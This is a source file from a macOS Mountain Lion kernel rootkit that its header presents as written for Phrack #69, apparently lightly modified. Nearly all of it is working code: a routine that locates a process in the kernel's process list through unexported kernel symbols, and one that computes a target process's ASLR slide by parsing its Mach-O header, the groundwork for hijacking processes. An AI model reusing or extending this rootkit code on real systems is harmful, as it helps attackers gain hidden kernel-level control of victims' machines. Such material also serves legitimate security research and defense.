/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * proc_utils.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "proc_utils.h"

#include <sys/param.h>
#include <sys/malloc.h>
#include <sys/dirent.h>
#include <mach-o/loader.h>
#include <stdint.h>

#include "kernel_info.h"
#include "cpu_protections.h"
#include "configuration.h"
#include "hijacking_utils.h"
#include "function_pointers.h"

#define PROC_NULL (proc_t)0

extern struct kernel_info g_kernel_info;

/*
 * get the proc_t structure corresponding to a given process name
 */
proc_t
find_proc_by_name(char *name)
{
    // get pointer to kernel process
    proc_t all_proc = proc_find(0);
    // don't forget to drop reference
    proc_rele(all_proc);
    if (all_proc == PROC_NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Couldn't find all_proc!\n");
#endif
        return PROC_NULL;
    }
    
    // we need to lock before searching - proc_list_lock() and proc_list_unlock() aren't exported
    if (_proc_list_lock == NULL) _proc_list_lock = (void*)solve_kernel_symbol(&g_kernel_info, "_proc_list_lock");
    if (_proc_list_unlock == NULL) _proc_list_unlock = (void*)solve_kernel_symbol(&g_kernel_info, "_proc_list_unlock");
    
    _proc_list_lock();
    for (proc_t tmp = all_proc ; tmp != PROC_NULL; tmp = (proc_t)(tmp->p_list.le_prev))
    {
        char processname[MAXCOMLEN+1] = { 0 };
        strlcpy(processname, tmp->p_comm, MAXCOMLEN+1);
        if (strncmp(tmp->p_comm, name, sizeof(tmp->p_comm)) == 0)
        {
            _proc_list_unlock();
#if DEBUG
//            //moony_modify//printf("[INFO] Found proc_t of %s\n", name);
#endif
            return tmp;
        }
    }
    _proc_list_unlock();
#if DEBUG
    //moony_modify//printf("[ERROR] Couldn't find target proc %s\n", name);
#endif
    return PROC_NULL;
}

/*
 * return aslr slide of a proc
 */
intptr_t
find_proc_aslr_slide(char *name)
{
    proc_t proc = find_proc_by_name(name);
    if (proc != PROC_NULL)
    {
        struct task *task = (struct task*)proc->task;
        mach_vm_address_t base_address = 0;
        if (task != NULL)
        {
            mach_vm_address_t memory_address = task->map->hdr.links.start;
            struct mach_header *mh = (struct mach_header*)memory_address;
            int header_size = 0;
            if (mh->magic == MH_MAGIC)
            {
                header_size = sizeof(struct mach_header);
            }
            else if (mh->magic == MH_MAGIC_64)
            {
                header_size = sizeof(struct mach_header_64);
            }
            else
            {
                return -1;
            }
            
            char *loadcmd_addr = (char*)mh + header_size;
            for (int i = 0; i < mh->ncmds; i++)
            {
                struct load_command *load_cmd = (struct load_command*)loadcmd_addr;
                if (load_cmd->cmd == LC_SEGMENT)
                {
                    struct segment_command *seg_cmd = (struct segment_command*)load_cmd;
                    if (strncmp(seg_cmd->segname, "__TEXT", 16) == 0)
                    {
                        base_address = seg_cmd->vmaddr;
                        break;
                    }
                }
                else if (load_cmd->cmd == LC_SEGMENT_64)
                {
                    struct segment_command_64 *seg_cmd = (struct segment_command_64*)load_cmd;
                    if (strncmp(seg_cmd->segname, "__TEXT", 16) == 0)
                    {
                        base_address = seg_cmd->vmaddr;
                        break;
                    }
                }
                loadcmd_addr += load_cmd->cmdsize;
            }
            
            // aslr slide is the difference between the two addresses
#if DEBUG
            //moony_modify//printf("[DEBUG] Aslr slide for %s is %p\n", name, (void*)(memory_address - base_address));
#endif
            return (memory_address - base_address);
        }
    }
    return -1;
}
